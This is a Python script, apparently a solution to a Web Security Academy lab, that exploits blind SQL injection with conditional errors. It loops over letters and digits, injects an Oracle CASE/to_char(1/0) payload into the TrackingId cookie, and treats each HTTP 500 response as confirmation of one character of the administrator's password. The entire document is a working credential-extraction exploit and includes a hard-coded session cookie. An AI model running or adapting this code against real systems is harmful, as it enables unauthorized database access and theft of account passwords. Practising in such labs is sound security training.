import requests
import string

chars = string.ascii_lowercase+string.digits
url='https://ac3b1f2a1e0d6987c053f3290061008a.web-security-academy.net/'
password=""
counter=1
while True:
    for char in chars:
        with requests.session() as sess:
            r = sess.get(url, cookies={
                "TrackingId":f"QvsXGUHpV1JdQico'||(select+case+when((select+substr(password,{counter},1)+from+users+where+username='administrator')='{char}')+then+to_char(1/0)+else+NULL+end+from+dual)||'",
                "session":"IPvFD5aMkPrNj5jHyLv1U7xj5UHxIDj4"
            })
        if(r.status_code==500):
            password+=char
            counter+=1
            print(password)
    if(len(password) == 20):
        break
